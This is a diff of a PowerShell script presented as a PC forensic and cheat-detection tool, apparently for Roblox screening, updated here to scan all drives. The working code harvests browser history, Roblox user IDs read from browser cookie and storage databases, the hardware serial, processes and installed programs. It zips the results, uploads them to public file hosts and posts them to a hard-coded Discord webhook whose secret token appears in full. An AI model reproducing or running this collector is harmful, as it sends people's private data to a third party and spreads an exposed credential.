@@ -1,13 +1,9 @@
-# Enhanced PC Forensic Tool v3.1 - FULL VERSION
-# Features: Multiple upload services, mandatory webhook, comprehensive logging
-
 param(
     [string]$WebhookURL = "https://discord.com/api/webhooks/1469718055591346380/u8BSIT-aDsZeuAue-sOa8Wla3wLj0hWY9bKZCbgSIP7SMCS24ao64q_PJPsVsYi599Ku"
 )
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# Force webhook input with validation
 while (-not $WebhookURL -or $WebhookURL.Length -lt 20) {
     Write-Host "`n[!] Discord Webhook URL is REQUIRED" -ForegroundColor Red
     Write-Host "Get it from: Discord Server Settings > Integrations > Webhooks" -ForegroundColor Yellow
@@ -26,11 +22,9 @@ while (-not $WebhookURL -or $WebhookURL.Length -lt 20) {
 Write-Host "`n✓ Webhook configured successfully!" -ForegroundColor Green
 Start-Sleep -Seconds 1
 
-# Suspicious patterns to search for
 $suspiciousPatterns = @("pot", "matrix", "newui", "matcha", "svchost1", "svc_host", "svc_host1", "svchost", "seliware", "potassium", "cryptic", "workspace")
 $suspiciousKeywords = @("cheat", "hack", "inject", "bypass", "aimbot", "wallhack", "esp", "triggerbot", "macro", "exploit", "trainer")
 
-# Create output directory with timestamp
 $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 $outputDir = "$env:USERPROFILE\Desktop\PCForensics_$timestamp"
 New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
@@ -244,7 +238,6 @@ function Upload-File {
     Write-Log "UPLOADING RESULTS TO FILE HOSTING SERVICE" "Cyan"
     Write-Log "$(Get-Separator)" "Cyan"
     
-    # Try services in order of preference
     $services = @(
         @{ Name = "Pixeldrain"; Function = ${function:Upload-ToPixelDrain} }
         @{ Name = "Catbox"; Function = ${function:Upload-ToCatbox} }
@@ -269,26 +262,34 @@ function Upload-File {
 function Search-Patterns {
     param($Text, $FilePath)
     
+    $textLower = $Text.ToLower()
+    
     foreach ($pattern in $suspiciousPatterns) {
-        if ($Text -match $pattern) {
+        $patternLower = $pattern.ToLower()
+        
+        if ($textLower -like "*$patternLower*") {
             $match = "PATTERN MATCH [$pattern] in: $FilePath"
-            $patternMatches += $match
-            Write-Log "  [!] Found pattern: $pattern" "Red"
+            
+            if ($patternMatches -notcontains $match) {
+                $script:patternMatches += $match
+                Write-Log "  [!] Found pattern: $pattern" "Red"
+            }
         }
     }
 }
 
 Write-Log "$(Get-Separator)" "Cyan"
-Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL v3.1" "Cyan"
+Write-Log "ENHANCED PC FORENSIC & SYSTEM ANALYSIS TOOL v3.3" "Cyan"
 Write-Log "Scan Started: $(Get-Date)" "Cyan"
 Write-Log "Webhook: Configured ✓" "Green"
+Write-Log "Scanning: ALL DRIVES (C:, D:, E:, etc.)" "Green"
+Write-Log "Pattern Matching: Enhanced (partial match enabled)" "Green"
 Write-Log "$(Get-Separator)" "Cyan"
 
-# Send initial Discord notification
 Send-DiscordMessage -Content "🔍 **PC Forensic Scan Started**" -Embeds @(
     @{
-        title = "Initializing Analysis"
-        description = "Starting comprehensive system scan..."
+        title = "Initializing Analysis v3.3"
+        description = "Starting comprehensive ALL DRIVE scan with enhanced pattern matching..."
         color = 3447003
         fields = @(
             @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
@@ -299,9 +300,6 @@ Send-DiscordMessage -Content "🔍 **PC Forensic Scan Started**" -Embeds @(
     }
 )
 
-# ============================================================================
-# GATHER COMPREHENSIVE SYSTEM INFORMATION
-# ============================================================================
 Write-Log "`n[*] Gathering Comprehensive System Information..." "Yellow"
 
 $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
@@ -364,7 +362,10 @@ $systemInfo.GetEnumerator() | Sort-Object Key | ForEach-Object {
     Write-Log "  $($_.Key): $($_.Value)"
 }
 
-# Disk Information
+Write-Log "`nDetecting All Available Drives..."
+$allDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
+Write-Log "Found drives: $($allDrives.Name -join ', ')" "Cyan"
+
 Write-Log "`nDisk Information:"
 $disk | ForEach-Object {
     Write-Log "  Drive $($_.DeviceID)"
@@ -373,19 +374,34 @@ $disk | ForEach-Object {
     Write-Log "    Used: $([math]::Round(($_.Size - $_.FreeSpace) / 1GB, 2)) GB"
 }
 
-# ============================================================================
-# SEARCH FOR SPECIFIC PATTERNS IN ALL FILES
-# ============================================================================
-Write-Log "`n[*] Searching for Specific Patterns..." "Yellow"
+Write-Log "`n[*] Searching for Specific Patterns (Enhanced Matching - ALL DRIVES)..." "Yellow"
 Write-Log "Patterns: $($suspiciousPatterns -join ', ')" "Cyan"
+Write-Log "Note: Will match partial occurrences (e.g., 'pota' matches 'pot')" "Yellow"
 
 $patternFile = "$outputDir\PATTERN_MATCHES.txt"
-"=== PATTERN SEARCH RESULTS ===" | Out-File $patternFile
+"=== PATTERN SEARCH RESULTS (Enhanced Matching - ALL DRIVES) ===" | Out-File $patternFile
 "Searching for: $($suspiciousPatterns -join ', ')" | Add-Content $patternFile
+"Pattern matching is case-insensitive and matches partial occurrences" | Add-Content $patternFile
+"Scanning ALL drives: $($allDrives.Name -join ', ')" | Add-Content $patternFile
 "" | Add-Content $patternFile
 
-# Search in common locations
-$searchLocations = @(
+$searchLocations = @()
+foreach ($drive in $allDrives) {
+    $driveLetter = $drive.Name
+    $searchLocations += @(
+        "${driveLetter}:\Users",
+        "${driveLetter}:\Program Files",
+        "${driveLetter}:\Program Files (x86)",
+        "${driveLetter}:\ProgramData",
+        "${driveLetter}:\Downloads",
+        "${driveLetter}:\Games",
+        "${driveLetter}:\Cheats",
+        "${driveLetter}:\Temp",
+        "${driveLetter}:\Documents"
+    )
+}
+
+$searchLocations += @(
     $env:APPDATA,
     $env:LOCALAPPDATA,
     $env:TEMP,
@@ -405,30 +421,13 @@ foreach ($location in $searchLocations) {
             $filePath = $_.FullName
             $fileName = $_.Name
             
-            # Check filename for patterns
-            foreach ($pattern in $suspiciousPatterns) {
-                if ($fileName -match $pattern) {
-                    $match = "FILENAME MATCH [$pattern]: $filePath"
-                    $patternMatches += $match
-                    Add-Content -Path $patternFile -Value $match
-                    Write-Log "  [!] Found in filename: $fileName" "Red"
-                }
-            }
+            Search-Patterns -Text $fileName -FilePath $filePath
             
-            # Check file content for text files
             if ($_.Extension -match '\.(txt|log|ini|cfg|json|xml)$') {
                 try {
                     $content = Get-Content $filePath -Raw -ErrorAction SilentlyContinue
                     if ($content) {
-                        foreach ($pattern in $suspiciousPatterns) {
-                            if ($content -match $pattern) {
-                                $match = "CONTENT MATCH [$pattern]: $filePath"
-                                $patternMatches += $match
-                                Add-Content -Path $patternFile -Value $match
-                                Write-Log "  [!] Found in content: $fileName" "Red"
-                                break
-                            }
-                        }
+                        Search-Patterns -Text $content -FilePath $filePath
                     }
                 } catch {}
             }
@@ -436,18 +435,30 @@ foreach ($location in $searchLocations) {
     }
 }
 
+$patternMatches | ForEach-Object { Add-Content -Path $patternFile -Value $_ }
+
 Write-Log "`nTotal pattern matches: $($patternMatches.Count)" "Cyan"
 Write-Log "Pattern results saved to: $patternFile" "Green"
 
-# ============================================================================
-# COMPREHENSIVE .CFG FILE SEARCH
-# ============================================================================
-Write-Log "`n[*] Searching for ALL .cfg Files..." "Yellow"
+Write-Log "`n[*] Searching for ALL .cfg Files (ALL DRIVES)..." "Yellow"
 
 $cfgFile = "$outputDir\CFG_FILES.txt"
-"=== ALL .CFG FILES FOUND ===" | Out-File $cfgFile
+"=== ALL .CFG FILES FOUND (ALL DRIVES) ===" | Out-File $cfgFile
 
-$cfgSearchPaths = @(
+$cfgSearchPaths = @()
+foreach ($drive in $allDrives) {
+    $driveLetter = $drive.Name
+    $cfgSearchPaths += @(
+        "${driveLetter}:\",
+        "${driveLetter}:\Users",
+        "${driveLetter}:\Program Files",
+        "${driveLetter}:\Program Files (x86)",
+        "${driveLetter}:\Games",
+        "${driveLetter}:\Cheats"
+    )
+}
+
+$cfgSearchPaths += @(
     $env:APPDATA,
     $env:LOCALAPPDATA,
     $env:TEMP,
@@ -458,9 +469,7 @@ $cfgSearchPaths = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Downloads",
     "$env:USERPROFILE\Desktop",
-    "C:\Windows\Prefetch",
-    "$env:USERPROFILE\AppData",
-    "C:\Users\Public"
+    "C:\Windows\Prefetch"
 )
 
 foreach ($path in $cfgSearchPaths) {
@@ -473,11 +482,12 @@ foreach ($path in $cfgSearchPaths) {
             $cfgFiles += $cfgInfo
             Add-Content -Path $cfgFile -Value $cfgInfo
             
-            # Search for patterns in cfg files
+            Search-Patterns -Text $_.Name -FilePath $_.FullName
             try {
                 $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                Search-Patterns -Text $content -FilePath $_.FullName
-                Search-Patterns -Text $_.Name -FilePath $_.FullName
+                if ($content) {
+                    Search-Patterns -Text $content -FilePath $_.FullName
+                }
             } catch {}
         }
     }
@@ -486,15 +496,11 @@ foreach ($path in $cfgSearchPaths) {
 Write-Log "Total .cfg files found: $($cfgFiles.Count)" "Cyan"
 Write-Log ".cfg files saved to: $cfgFile" "Green"
 
-# ============================================================================
-# COMPREHENSIVE .EXE FILE SEARCH
-# ============================================================================
-Write-Log "`n[*] Searching for ALL .exe Files..." "Yellow"
+Write-Log "`n[*] Searching for ALL .exe Files (ALL DRIVES)..." "Yellow"
 
 $exeFile = "$outputDir\EXE_FILES.txt"
-"=== ALL .EXE FILES FOUND ===" | Out-File $exeFile
+"=== ALL .EXE FILES FOUND (ALL DRIVES) ===" | Out-File $exeFile
 
-# Recent items
 Write-Log "Checking shell:recent..." "Yellow"
 Add-Content -Path $exeFile -Value "`n=== RECENT ITEMS (shell:recent) ==="
 $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
@@ -508,15 +514,26 @@ if (Test-Path $recentPath) {
                 $exeFiles += $exeInfo
                 Add-Content -Path $exeFile -Value $exeInfo
                 
-                # Search for patterns
                 Search-Patterns -Text $shortcut.TargetPath -FilePath "Recent:$($_.Name)"
             }
         } catch {}
     }
 }
 
-# Search all locations for .exe files
-$exeSearchPaths = @(
+$exeSearchPaths = @()
+foreach ($drive in $allDrives) {
+    $driveLetter = $drive.Name
+    $exeSearchPaths += @(
+        "${driveLetter}:\Users",
+        "${driveLetter}:\Program Files",
+        "${driveLetter}:\Program Files (x86)",
+        "${driveLetter}:\Games",
+        "${driveLetter}:\Cheats",
+        "${driveLetter}:\Downloads"
+    )
+}
+
+$exeSearchPaths += @(
     $env:APPDATA,
     $env:LOCALAPPDATA,
     $env:TEMP,
@@ -538,13 +555,11 @@ foreach ($path in $exeSearchPaths) {
             $exeFiles += $exeInfo
             Add-Content -Path $exeFile -Value $exeInfo
             
-            # Search for patterns in exe name and path
             Search-Patterns -Text $_.FullName -FilePath $_.FullName
             Search-Patterns -Text $_.Name -FilePath $_.FullName
             
-            # Check for suspicious keywords
             foreach ($keyword in $suspiciousKeywords) {
-                if ($_.Name -match $keyword) {
+                if ($_.Name -like "*$keyword*") {
                     $suspiciousItems += "EXE: $($_.FullName)"
                 }
             }
@@ -552,7 +567,6 @@ foreach ($path in $exeSearchPaths) {
     }
 }
 
-# Prefetch .pf files (indicate exe execution)
 Write-Log "Analyzing Prefetch for executed .exe..." "Yellow"
 Add-Content -Path $exeFile -Value "`n=== PREFETCH (Executed Programs) ==="
 if (Test-Path "C:\Windows\Prefetch") {
@@ -561,7 +575,6 @@ if (Test-Path "C:\Windows\Prefetch") {
         $exeFiles += $exeInfo
         Add-Content -Path $exeFile -Value $exeInfo
         
-        # Search for patterns
         Search-Patterns -Text $_.Name -FilePath "Prefetch:$($_.Name)"
     }
 }
@@ -569,15 +582,11 @@ if (Test-Path "C:\Windows\Prefetch") {
 Write-Log "Total .exe files found: $($exeFiles.Count)" "Cyan"
 Write-Log ".exe files saved to: $exeFile" "Green"
 
-# ============================================================================
-# ROBLOX ACCOUNT DETECTION
-# ============================================================================
 Write-Log "`n[*] Searching for Roblox Accounts..." "Yellow"
 
 $robloxFile = "$outputDir\ROBLOX_ACCOUNTS.txt"
 "=== ROBLOX ACCOUNTS FOUND ===" | Out-File $robloxFile
 
-# Check Roblox App Data
 $robloxAppDataPaths = @(
     "$env:LOCALAPPDATA\Roblox\logs",
     "$env:LOCALAPPDATA\Roblox\LocalStorage",
@@ -599,24 +608,27 @@ foreach ($path in $robloxAppDataPaths) {
                 if ($content -match 'userId["\s:]+(\d{8,12})') {
                     $userId = $matches[1]
                     $accountInfo = "User ID: $userId (from $($_.Name))"
-                    Add-Content -Path $robloxFile -Value $accountInfo
-                    $robloxAccounts += $accountInfo
-                    Write-Log "  Found User ID: $userId" "Green"
+                    if ($robloxAccounts -notcontains $accountInfo) {
+                        Add-Content -Path $robloxFile -Value $accountInfo
+                        $robloxAccounts += $accountInfo
+                        Write-Log "  Found User ID: $userId" "Green"
+                    }
                 }
                 
                 if ($content -match 'username["\s:]+([a-zA-Z0-9_]{3,20})') {
                     $username = $matches[1]
                     $accountInfo = "Username: $username (from $($_.Name))"
-                    Add-Content -Path $robloxFile -Value $accountInfo
-                    $robloxAccounts += $accountInfo
-                    Write-Log "  Found Username: $username" "Green"
+                    if ($robloxAccounts -notcontains $accountInfo) {
+                        Add-Content -Path $robloxFile -Value $accountInfo
+                        $robloxAccounts += $accountInfo
+                        Write-Log "  Found Username: $username" "Green"
+                    }
                 }
             } catch {}
         }
     }
 }
 
-# Check Browser Data for Roblox
 $browserPaths = @{
     "Chrome" = @{
         "Cookies" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
@@ -662,8 +674,10 @@ foreach ($browser in $browserPaths.GetEnumerator()) {
                             foreach ($id in $userIds) {
                                 if ($id -match '^\d{8,12}$') {
                                     $accountInfo = "User ID: $id (from $($browser.Key))"
-                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
-                                    $robloxAccounts += $accountInfo
+                                    if ($robloxAccounts -notcontains $accountInfo) {
+                                        Add-Content -Path $robloxFile -Value "  $accountInfo"
+                                        $robloxAccounts += $accountInfo
+                                    }
                                 }
                             }
                         }
@@ -675,17 +689,21 @@ foreach ($browser in $browserPaths.GetEnumerator()) {
                                 if ($content -match 'userId["\s:]+(\d{8,12})') {
                                     $userId = $matches[1]
                                     $accountInfo = "User ID: $userId (from $($browser.Key))"
-                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
-                                    $robloxAccounts += $accountInfo
-                                    Write-Log "    Found User ID: $userId" "Green"
+                                    if ($robloxAccounts -notcontains $accountInfo) {
+                                        Add-Content -Path $robloxFile -Value "  $accountInfo"
+                                        $robloxAccounts += $accountInfo
+                                        Write-Log "    Found User ID: $userId" "Green"
+                                    }
                                 }
                                 
                                 if ($content -match '"username":"([a-zA-Z0-9_]{3,20})"') {
                                     $username = $matches[1]
                                     $accountInfo = "Username: $username (from $($browser.Key))"
-                                    Add-Content -Path $robloxFile -Value "  $accountInfo"
-                                    $robloxAccounts += $accountInfo
-                                    Write-Log "    Found Username: $username" "Green"
+                                    if ($robloxAccounts -notcontains $accountInfo) {
+                                        Add-Content -Path $robloxFile -Value "  $accountInfo"
+                                        $robloxAccounts += $accountInfo
+                                        Write-Log "    Found Username: $username" "Green"
+                                    }
                                 }
                             }
                         }
@@ -698,9 +716,6 @@ foreach ($browser in $browserPaths.GetEnumerator()) {
 
 Write-Log "Total Roblox accounts found: $($robloxAccounts.Count)" "Cyan"
 
-# ============================================================================
-# BROWSER HISTORY
-# ============================================================================
 Write-Log "`n[*] Extracting Browser History..." "Yellow"
 
 $browserHistoryFile = "$outputDir\BROWSER_HISTORY.txt"
@@ -747,9 +762,6 @@ foreach ($browser in $historyPaths.GetEnumerator()) {
 
 Write-Log "Browser history saved to: $browserHistoryFile" "Green"
 
-# ============================================================================
-# DELETED FILES
-# ============================================================================
 Write-Log "`n[*] Scanning for Deleted Files..." "Yellow"
 
 $deletedFile = "$outputDir\DELETED_FILES.txt"
@@ -764,11 +776,10 @@ if (Test-Path $recycleBinPath) {
         $deletedInfo = "$($_.LastWriteTime) - $($_.Name) - $($_.Length) bytes - $($_.FullName)"
         Add-Content -Path $deletedFile -Value $deletedInfo
         
-        # Search for patterns
         Search-Patterns -Text $_.Name -FilePath "RecycleBin:$($_.Name)"
         
         foreach ($keyword in $suspiciousKeywords) {
-            if ($_.Name -match $keyword) {
+            if ($_.Name -like "*$keyword*") {
                 $suspiciousItems += "DELETED: $deletedInfo"
             }
         }
@@ -777,11 +788,6 @@ if (Test-Path $recycleBinPath) {
 
 Write-Log "Deleted files saved to: $deletedFile" "Green"
 
-# ============================================================================
-# OTHER STANDARD CHECKS
-# ============================================================================
-
-# MUICache
 Write-Log "`n[*] Analyzing MUICache..." "Yellow"
 $muiFile = "$outputDir\MUICACHE.txt"
 "=== MUICACHE (Application Execution History) ===" | Out-File $muiFile
@@ -797,7 +803,6 @@ $muiFile = "$outputDir\MUICACHE.txt"
 }
 Write-Log "MUICache saved to: $muiFile" "Green"
 
-# Running Processes
 Write-Log "`n[*] Analyzing Running Processes..." "Yellow"
 $processFile = "$outputDir\PROCESSES.txt"
 "=== RUNNING PROCESSES ===" | Out-File $processFile
@@ -809,7 +814,6 @@ Get-Process | Sort-Object CPU -Descending | ForEach-Object {
 }
 Write-Log "Processes saved to: $processFile" "Green"
 
-# Installed Programs
 Write-Log "`n[*] Gathering Installed Programs..." "Yellow"
 $programsFile = "$outputDir\PROGRAMS.txt"
 "=== INSTALLED PROGRAMS ===" | Out-File $programsFile
@@ -823,9 +827,6 @@ Where-Object { $_.DisplayName } | Sort-Object DisplayName | ForEach-Object {
 }
 Write-Log "Programs saved to: $programsFile" "Green"
 
-# ============================================================================
-# CREATE COMPREHENSIVE SUMMARY
-# ============================================================================
 Write-Log "`n[*] Creating Summary Report..." "Yellow"
 
 $summaryFile = "$outputDir\SUMMARY_REPORT.txt"
@@ -833,13 +834,16 @@ $isSuspicious = ($suspiciousItems.Count -gt 0) -or ($patternMatches.Count -gt 0)
 
 $summary = @"
 ==============================================================================
-                    PC FORENSIC ANALYSIS SUMMARY v3.1
+                    PC FORENSIC ANALYSIS SUMMARY v3.3
 ==============================================================================
 
 Scan Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
 Computer: $($systemInfo.ComputerName)
 User: $($systemInfo.Username)
 Status: $(if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✓ No obvious threats" })
+
+Drives Scanned: $($allDrives.Name -join ', ')
+Pattern Matching: Enhanced (partial match - e.g., 'pota' matches 'pot')
 
 ==============================================================================
 SYSTEM DETAILS
@@ -930,20 +934,13 @@ FILES GENERATED
 $summary | Out-File $summaryFile
 Write-Log "Summary report created: $summaryFile" "Green"
 
-# ============================================================================
-# UPLOAD AND SEND TO DISCORD
-# ============================================================================
-
-# Create ZIP
 $zipFile = "$env:TEMP\Forensics_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
 Write-Log "`n[*] Creating ZIP archive..." "Yellow"
 Compress-Archive -Path "$outputDir\*" -DestinationPath $zipFile -Force
 Write-Log "ZIP created: $zipFile" "Green"
 
-# Upload
 $uploadResult = Upload-File -FilePath $zipFile
 
-# Send comprehensive Discord webhook
 if ($uploadResult -and $uploadResult.url) {
     Write-Log "`n$(Get-Separator)" "Cyan"
     Write-Log "SENDING RESULTS TO DISCORD..." "Yellow"
@@ -965,7 +962,7 @@ if ($uploadResult -and $uploadResult.url) {
         @{ name = "🎮 GPU"; value = "$($systemInfo.GPUName) (Driver: $($systemInfo.GPUDriverVersion))"; inline = $false }
         @{ name = "🏭 Manufacturer"; value = "$($systemInfo.Manufacturer) $($systemInfo.Model)"; inline = $true }
         @{ name = "🔢 Serial"; value = $systemInfo.SerialNumber; inline = $true }
-        @{ name = "🌍 Time Zone"; value = $systemInfo.TimeZone; inline = $true }
+        @{ name = "💽 Drives Scanned"; value = $($allDrives.Name -join ', '); inline = $true }
         @{ name = "━━━━━ DETECTION RESULTS ━━━━━"; value = "** **"; inline = $false }
         @{ name = "🎯 Pattern Matches"; value = "$($patternMatches.Count) found"; inline = $true }
         @{ name = "🎮 Roblox Accounts"; value = "$($robloxAccounts.Count) found"; inline = $true }
@@ -974,34 +971,33 @@ if ($uploadResult -and $uploadResult.url) {
         @{ name = "⚠️ Suspicious Items"; value = "$($suspiciousItems.Count) detected"; inline = $true }
     )
     
-    # Add pattern matches preview
     if ($patternMatches.Count -gt 0) {
-        $patternList = ($patternMatches | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
+        $uniquePatterns = $patternMatches | Select-Object -First 5
+        $patternList = ($uniquePatterns | ForEach-Object { "• $_" }) -join "`n"
         if ($patternMatches.Count -gt 5) {
             $patternList += "`n... and $($patternMatches.Count - 5) more (see full report)"
         }
         $fields += @{ name = "🔴 CRITICAL - Pattern Matches"; value = $patternList; inline = $false }
     }
     
-    # Add Roblox accounts
     if ($robloxAccounts.Count -gt 0) {
-        $robloxList = ($robloxAccounts | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
+        $uniqueAccounts = $robloxAccounts | Select-Object -Unique -First 5
+        $robloxList = ($uniqueAccounts | ForEach-Object { "• $_" }) -join "`n"
         if ($robloxAccounts.Count -gt 5) {
             $robloxList += "`n... and $($robloxAccounts.Count - 5) more"
         }
         $fields += @{ name = "🎮 Roblox Accounts"; value = $robloxList; inline = $false }
     }
     
-    # Add suspicious items
     if ($suspiciousItems.Count -gt 0) {
-        $suspList = ($suspiciousItems | Select-Object -First 3 | ForEach-Object { "• $_" }) -join "`n"
+        $uniqueSuspicious = $suspiciousItems | Select-Object -Unique -First 3
+        $suspList = ($uniqueSuspicious | ForEach-Object { "• $_" }) -join "`n"
         if ($suspiciousItems.Count -gt 3) {
             $suspList += "`n... and $($suspiciousItems.Count - 3) more"
         }
         $fields += @{ name = "⚠️ Suspicious Findings"; value = $suspList; inline = $false }
     }
     
-    # Add download link
     $fields += @{ 
         name = "📥 DOWNLOAD FULL REPORT" 
         value = "**[$($uploadResult.url)]($($uploadResult.url))**`n`nService: $($uploadResult.service)`nExpires: $($uploadResult.expiry)" 
@@ -1010,24 +1006,24 @@ if ($uploadResult -and $uploadResult.url) {
     
     $embed = @{
         title = if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✅ SYSTEM SCAN COMPLETE - CLEAN" }
-        description = "**Comprehensive PC Forensic Analysis Report v3.1**"
+        description = "**Comprehensive PC Forensic Analysis Report v3.3**`nALL DRIVES scanned - Enhanced pattern matching"
         color = $embedColor
         fields = $fields
         footer = @{
-            text = "PC Forensic Tool v3.1 | Scan ID: $timestamp"
+            text = "PC Forensic Tool v3.3 | ALL DRIVES | Enhanced Matching | Scan ID: $timestamp"
         }
         timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
     }
     
-    Send-DiscordMessage -Content "**🔍 Forensic Analysis Complete**" -Embeds @($embed)
+    Send-DiscordMessage -Content "**🔍 Forensic Analysis Complete - ALL DRIVES**" -Embeds @($embed)
 } else {
-    # Upload failed, send basic info
     Write-Log "`n[!] Upload failed - Sending basic report to Discord..." "Yellow"
     
     $fields = @(
         @{ name = "⚠️ Status"; value = "Upload Failed - Results saved locally only"; inline = $false }
         @{ name = "Computer"; value = $systemInfo.ComputerName; inline = $true }
         @{ name = "User"; value = $systemInfo.Username; inline = $true }
+        @{ name = "Drives Scanned"; value = $($allDrives.Name -join ', '); inline = $true }
         @{ name = "Pattern Matches"; value = "$($patternMatches.Count)"; inline = $true }
         @{ name = "Roblox Accounts"; value = "$($robloxAccounts.Count)"; inline = $true }
         @{ name = "Status"; value = if ($isSuspicious) { "SUSPICIOUS" } else { "Clean" }; inline = $true }
@@ -1045,15 +1041,12 @@ if ($uploadResult -and $uploadResult.url) {
     Send-DiscordMessage -Content "**Upload Failed - Scan Complete**" -Embeds @($embed)
 }
 
-# Clean up temp ZIP
 Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
 
-# ============================================================================
-# COMPLETION
-# ============================================================================
 Write-Log "`n$(Get-Separator)" "Cyan"
 Write-Log "SCAN COMPLETE!" "Green"
 Write-Log "Status: $(if ($isSuspicious) { '⚠️ SUSPICIOUS' } else { '✓ CLEAN' })" $(if ($isSuspicious) { "Red" } else { "Green" })
+Write-Log "Drives Scanned: $($allDrives.Name -join ', ')" "Cyan"
 Write-Log "Pattern Matches: $($patternMatches.Count)" "Cyan"
 Write-Log "Roblox Accounts: $($robloxAccounts.Count)" "Cyan"
 Write-Log "Results folder: $outputDir" "Cyan"
@@ -1063,7 +1056,6 @@ if ($uploadResult) {
 }
 Write-Log "$(Get-Separator)" "Cyan"
 
-# Open results folder
 Start-Process explorer.exe $outputDir
 
 Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
